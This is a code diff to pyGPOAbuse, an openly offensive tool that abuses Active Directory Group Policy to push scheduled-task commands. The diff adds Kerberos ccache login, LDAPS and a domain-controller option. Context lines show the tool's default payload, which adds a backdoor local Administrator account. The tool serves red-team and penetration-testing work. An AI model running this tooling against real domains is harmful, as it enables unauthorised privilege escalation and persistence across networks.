@@ -13,6 +13,7 @@ import re
 import sys
 
 from impacket.smbconnection import SMBConnection
+from impacket.examples.utils import parse_credentials
 
 from pygpoabuse import logger
 from pygpoabuse.gpo import GPO
@@ -29,6 +30,13 @@ parser.add_argument('-description', action='store', help='Task description (Defa
 parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
 parser.add_argument('-command', action='store',
                     help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
+parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
+                                        '(KRB5CCNAME) based on target parameters. If valid credentials '
+                                        'cannot be found, it will use the ones specified in the command '
+                                        'line')
+parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
+parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
+parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
 parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
 parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
 
@@ -52,20 +60,18 @@ elif options.v >= 2:
 else:
     logging.getLogger().setLevel(logging.ERROR)
 
-targetParam = options.target 
-domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
-    targetParam).groups('')
+domain, username, password = parse_credentials(options.target)
 
-# In case the password contains '@'
-if '@' in address:
-    password = password + '@' + address.rpartition('@')[0]
-    address = address.rpartition('@')[2]
+if options.dc_ip:
+    dc_ip = options.dc_ip
+else:
+    dc_ip = domain
 
 if domain == '':
     logging.critical('Domain should be specified!')
     sys.exit(1)
 
-if password == '' and username != '' and options.hashes is None:
+if password == '' and username != '' and options.hashes is None and options.k is False:
     from getpass import getpass
     password = getpass("Password:")
 elif options.hashes is not None:
@@ -73,12 +79,21 @@ elif options.hashes is not None:
         logging.error("Wrong hash format. Expecting lm:nt")
         sys.exit(1)
 
-dc_ip = domain
-if password != '':
-    url = 'ldap+ntlm-password://{}\\{}:{}@{}'.format(domain, username, password, address)
+if options.ldaps:
+    protocol = 'ldaps'
+else:
+    protocol = 'ldap'
+
+if options.k:
+    if not options.ccache:
+        logging.error('-ccache required (path of ccache file, must be in local directory)')
+        sys.exit(1)
+    url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip, dc_ip)
+elif password != '':
+    url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
     lmhash, nthash = "",""
 else:
-    url = 'ldap+ntlm-nt://{}\\{}:{}@{}'.format(domain, username, options.hashes.split(":")[1], address)
+    url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
     lmhash, nthash = options.hashes.split(":")
 
 
@@ -93,7 +108,10 @@ def get_session(address, target_ip="", username="", password="", lmhash="", ntha
 
 try:
     smb_session = SMBConnection(dc_ip, dc_ip)
-    smb_session.login(username, password, domain, lmhash, nthash)
+    if options.k:
+        smb_session.kerberosLogin(user=username, password='', domain=domain, kdcHost=dc_ip)
+    else:
+        smb_session.login(username, password, domain, lmhash, nthash)
 except Exception as e:
     logging.error("SMB connection error", exc_info=True)
     sys.exit(1)
